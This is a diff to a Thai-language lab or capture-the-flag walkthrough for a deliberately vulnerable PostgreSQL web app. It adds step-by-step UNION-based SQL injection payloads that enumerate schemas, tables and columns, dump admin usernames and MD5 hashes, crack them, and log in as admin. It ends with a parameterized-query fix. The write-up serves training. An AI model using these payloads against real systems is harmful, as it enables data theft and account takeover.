@@ -447,6 +447,34 @@ seller1'--
 
 UNION ใน SQL ใช้รวมผลลัพธ์จากหลาย queries แต่ต้องมีจำนวน columns เท่ากัน
 
+### Vulnerable Code
+
+```javascript
+// src/routes/lab05.js:31
+const query = `SELECT id, name, department, position FROM staff
+               WHERE name LIKE '%${search}%' OR department LIKE '%${search}%'`;
+```
+
+User input (`search`) ถูกต่อเข้า SQL โดยตรง ไม่มี sanitization
+
+### PostgreSQL Database Structure
+
+```
+Database (thaimart)
+│
+├── Schema: pg_catalog      ← System tables (internal)
+├── Schema: pg_toast        ← TOAST storage (internal)
+├── Schema: information_schema  ← Metadata (read-only)
+│
+└── Schema: public          ← User tables อยู่ที่นี่
+    │
+    ├── Table: staff
+    ├── Table: admin_credentials  ← เป้าหมาย!
+    ├── Table: seller_accounts
+    ├── Table: secret_orders
+    └── ...
+```
+
 ### Walkthrough
 
 #### Step 1: หาจำนวน columns
@@ -467,63 +495,108 @@ UNION ใน SQL ใช้รวมผลลัพธ์จากหลาย qu
 
 ดูว่าเลข 1,2,3,4 แสดงที่ตำแหน่งไหนบนหน้าเว็บ
 
+**ทำไมต้อง 4 columns?** เพราะ original query คืน 4 columns:
+```sql
+SELECT id, name, department, position FROM staff
+```
+
+UNION ต้องการจำนวน columns เท่ากันทั้งสอง queries:
+```sql
+UNION SELECT null, null, schema_name, null
+--          ↑     ↑      ↑           ↑
+--          id   name   department  position
+```
+
 #### Step 3: ดึง Database version
 ```
-' UNION SELECT 1,version(),3,4--
+' UNION SELECT null,version(),null,null--
 ```
 
 **ผลลัพธ์:** `PostgreSQL 16.x`
 
-#### Step 4: ดึงรายชื่อ tables
+#### Step 4: หา Schemas (Optional)
 ```
-' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()--
+' UNION SELECT null,null,schema_name,null FROM information_schema.schemata --
 ```
+
+**ผลลัพธ์:** `pg_toast, public, pg_catalog, information_schema`
+
+**ความหมาย:**
+| Schema | คำอธิบาย |
+|--------|----------|
+| `public` | User tables อยู่ที่นี่ (เป้าหมาย) |
+| `pg_catalog` | System tables ภายใน |
+| `information_schema` | Metadata (read-only) |
+| `pg_toast` | TOAST storage ภายใน |
+
+#### Step 5: ดึงรายชื่อ tables
+```
+' UNION SELECT null,null,table_name,null FROM information_schema.tables WHERE table_schema=current_schema()--
+```
+
+**ทำไมใช้ `current_schema()`?**
+- คืนค่า `public` (default schema)
+- กรอง system tables จาก `pg_catalog`, `information_schema` ออก
 
 **ผลลัพธ์ที่ควรเห็น:**
 ```
-ID │ ชื่อ-นามสกุล       │ แผนก │ ตำแหน่ง
-───┼───────────────────┼──────┼────────
-1  │ staff             │ 3    │ 4
-1  │ admin_credentials │ 3    │ 4
-1  │ playground_products│ 3   │ 4
-1  │ seller_accounts   │ 3    │ 4
-...
+playground_products, category_products, secret_orders, reviews,
+seller_accounts, admin_credentials, categories, logs, staff, search_products
 ```
 
 💡 **สังเกต:** ชื่อตาราง `admin_credentials` ดูน่าสนใจ!
 
-#### Step 5: ดึง columns ของ admin_credentials
-```
-' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'--
+#### Step 4 vs Step 5: ทำไมต้องทั้งสองขั้นตอน?
+
+| Step | คำถามที่ตอบ |
+|------|------------|
+| Step 4 (Schemas) | "Database นี้มี schemas อะไรบ้าง?" (reconnaissance) |
+| Step 5 (Tables) | "ใน schema เป้าหมายมี tables อะไรบ้าง?" |
+
+**Shortcut:** ถ้ามั่นใจว่า tables อยู่ใน `public` สามารถข้าม Step 4 ได้:
+```sql
+' UNION SELECT null,null,table_name,null
+FROM information_schema.tables
+WHERE table_schema='public'--
 ```
 
-**ผลลัพธ์:** `id`, `username`, `password_hash`, `role`
-
-#### Step 6: ดึงข้อมูล admin
+#### Step 6: ดึง columns ของ admin_credentials
 ```
-' UNION SELECT id,username,password_hash,role FROM admin_credentials--
+' UNION SELECT null,null,column_name,null FROM information_schema.columns WHERE table_name='admin_credentials'--
+```
+
+**ผลลัพธ์:** `username`, `id`, `password_hash`, `role`
+
+#### Step 7: ดึงข้อมูล admin
+```
+' UNION SELECT 1,username,password_hash,role FROM admin_credentials--
 ```
 
 **ผลลัพธ์ที่ควรเห็น:**
 ```
-ID │ ชื่อ-นามสกุล │ แผนก                             │ ตำแหน่ง
-───┼─────────────┼──────────────────────────────────┼─────────────
-1  │ superadmin  │ e10adc3949ba59abbe56e057f20f883e │ administrator
+ID │ ชื่อ-นามสกุล  │ แผนก                             │ ตำแหน่ง
+───┼──────────────┼──────────────────────────────────┼─────────────
+1  │ backup_admin │ 5f4dcc3b5aa765d61d8327deb882cf99 │ administrator
+1  │ superadmin   │ e10adc3949ba59abbe56e057f20f883e │ administrator
 ```
 
-💡 **พบบัญชี:** `superadmin` พร้อม password hash (MD5)
+💡 **พบ 2 บัญชี:**
+- `superadmin` พร้อม password hash (MD5)
+- `backup_admin` (bonus find!)
 
-#### Step 7: Crack MD5 Hash
-Password hash ที่ได้: `e10adc3949ba59abbe56e057f20f883e`
+#### Step 8: Crack MD5 Hash
+
+| Username | Password Hash (MD5) | Cracked |
+|----------|---------------------|---------|
+| `superadmin` | `e10adc3949ba59abbe56e057f20f883e` | `123456` |
+| `backup_admin` | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
 
 ใช้เครื่องมือ crack เช่น:
 - https://crackstation.net
 - https://hashes.com/en/decrypt/hash
 - `hashcat -m 0 hash.txt wordlist.txt`
 
-**ผลลัพธ์:** `123456`
-
-#### Step 8: Login เข้า Admin Panel
+#### Step 9: Login เข้า Admin Panel
 1. ไปที่ http://10.10.61.87/lab05/admin
 2. ใส่ Username: `superadmin`
 3. ใส่ Password: `123456`
@@ -536,12 +609,99 @@ Password hash ที่ได้: `e10adc3949ba59abbe56e057f20f883e`
 Flag: SMC{un10n_2_4dm1n_p4n3l}
 ```
 
+### Attack Flow Diagram
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 1-2: Find column count                                    │
+│  ' ORDER BY 4--  →  ✓ works                                     │
+│  ' ORDER BY 5--  →  ✗ error  →  4 columns                       │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 3: Get DB version                                         │
+│  ' UNION SELECT null,version(),null,null--                      │
+│  → PostgreSQL 16.x                                              │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 4: Find schemas (optional)                                │
+│  ' UNION SELECT null,null,schema_name,null                      │
+│  FROM information_schema.schemata --                            │
+│  → pg_toast, public, pg_catalog, information_schema             │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 5: Find tables in current schema                          │
+│  ' UNION SELECT null,null,table_name,null                       │
+│  FROM information_schema.tables                                 │
+│  WHERE table_schema=current_schema()--                          │
+│  → Found: admin_credentials (interesting!)                      │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 6: Find columns in admin_credentials                      │
+│  ' UNION SELECT null,null,column_name,null                      │
+│  FROM information_schema.columns                                │
+│  WHERE table_name='admin_credentials'--                         │
+│  → username, id, password_hash, role                            │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 7: Extract the data                                       │
+│  ' UNION SELECT 1,username,password_hash,role                   │
+│  FROM admin_credentials--                                       │
+│  → superadmin : e10adc3949ba59abbe56e057f20f883e                │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 8: Crack MD5 hash                                         │
+│  e10adc3949ba59abbe56e057f20f883e → "123456"                    │
+│  (Use crackstation.net or hashcat)                              │
+└─────────────────────────────────────────────────────────────────┘
+                              ↓
+┌─────────────────────────────────────────────────────────────────┐
+│  Step 9: Login at /lab05/admin                                  │
+│  Username: superadmin                                           │
+│  Password: 123456                                               │
+│  → Flag: SMC{un10n_2_4dm1n_p4n3l}                               │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### How the Payload Works
+
+**Payload:** `' UNION SELECT null,null,table_name,null FROM information_schema.tables WHERE table_schema=current_schema()--`
+
+**Resulting SQL:**
+```sql
+SELECT id, name, department, position FROM staff
+WHERE name LIKE '%' UNION SELECT null,null,table_name,null
+FROM information_schema.tables WHERE table_schema=current_schema()--%'
+OR department LIKE '%...%'
+```
+
+| Part | Purpose |
+|------|---------|
+| `'` | ปิด string `LIKE '%` |
+| `UNION SELECT` | ต่อผลลัพธ์จาก query ที่สอง |
+| `null,null,table_name,null` | ต้องมี 4 columns ให้ตรงกับ original query |
+| `--` | Comment ส่วนที่เหลือออก (`%' OR department...`) |
+
 ### สิ่งที่เรียนรู้
 - UNION-based SQLi ใช้ดึงข้อมูลจาก tables อื่น
 - `information_schema` เก็บ metadata ของ database
-- ขั้นตอนการ enumerate: columns → tables → data
+- ขั้นตอนการ enumerate: schemas → tables → columns → data
+- PostgreSQL structure: Database → Schema → Table
 - Password hashes สามารถ crack ได้ถ้าใช้รหัสผ่านง่ายๆ
 - ข้อมูลที่ได้จาก SQLi สามารถนำไปใช้โจมตีต่อได้ (credential reuse)
+
+### การป้องกัน (The Fix)
+```javascript
+// Safe version with parameterized query
+const query = `SELECT id, name, department, position FROM staff
+               WHERE name LIKE $1 OR department LIKE $1`;
+const result = await pool.query(query, [`%${search}%`]);
+```
 
 ---
 
@@ -1052,7 +1212,15 @@ ffuf -u http://10.10.61.87/lab12/verify \
 ---
 
 *สร้างเมื่อ: 2026-04-19*
-*อัปเดตล่าสุด: 2026-04-20*
+*อัปเดตล่าสุด: 2026-04-21*
+- Lab 05: เพิ่มคำอธิบาย PostgreSQL database structure (Schema → Table hierarchy)
+- Lab 05: เพิ่ม Attack Flow Diagram แสดงขั้นตอนการโจมตี
+- Lab 05: อธิบาย Step 4 vs Step 5 (Schema vs Table enumeration)
+- Lab 05: เพิ่ม "How the Payload Works" section
+- Lab 05: เพิ่ม backup_admin credentials ในผลลัพธ์
+- Lab 05: เพิ่มวิธีป้องกัน (parameterized query)
+
+*อัปเดต: 2026-04-20*
 - Lab 03: ระบุว่าไม่มีตัวอย่างให้คลิก (นักเรียนต้องคิดเอง)
 - Lab 04: เพิ่ม flag `SMC{4uth_byp4ss_success}`
 - Lab 05: เพิ่มผลลัพธ์ที่ควรเห็นสำหรับ Step 4 และ Step 6
